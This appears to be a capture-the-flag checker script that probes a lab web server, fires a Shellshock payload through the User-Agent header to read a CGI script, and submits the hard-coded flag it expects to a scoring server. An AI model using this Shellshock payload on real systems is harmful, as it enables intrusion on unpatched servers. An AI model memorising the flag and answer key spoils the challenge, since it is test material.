#!/bin/bash

MATCH=`curl -s "172.20.0.39/index.html" | \
       grep -o 'href="/report"'`
if [[ "$MATCH" == "" ]]
then
    echo "Error - index.html does not contain redirection to /report page"
    exit 1
fi

MATCH=`curl -s "172.20.0.39/report"`
if [[ "$MATCH" == "" ]]
then
    echo "Error - /report endpoint does not return bash version 'GNU bash, version 4.2.37'"
    exit 2
fi

MATCH=`curl -s -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat report" 172.20.0.39/report | \
       grep -o "BSY{cIAXNcTzjPEkH5nZU1LV6uPrSIvHpGPEoApUQXfkyftsZOmnsUokQeUfDmEW}"`
if [[ "$MATCH" == "" ]]
then
    echo "Error - shell shock exploit to read the report bash script did not return a flag"
    exit 3
fi

# submit a flag in the submission server
RES=`curl -s 'http://172.20.0.3/api/challenges/submit' \
    -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"challenge_id": "shockwave-report", "task_id": "task1", "flag" : "BSY{cIAXNcTzjPEkH5nZU1LV6uPrSIvHpGPEoApUQXfkyftsZOmnsUokQeUfDmEW}"}'`

if [[ $RES != *"Congratulations"* ]]; then
  echo "Failed to submit the flag - $RES"
  exit 4
fi

echo "OK - tests passed"
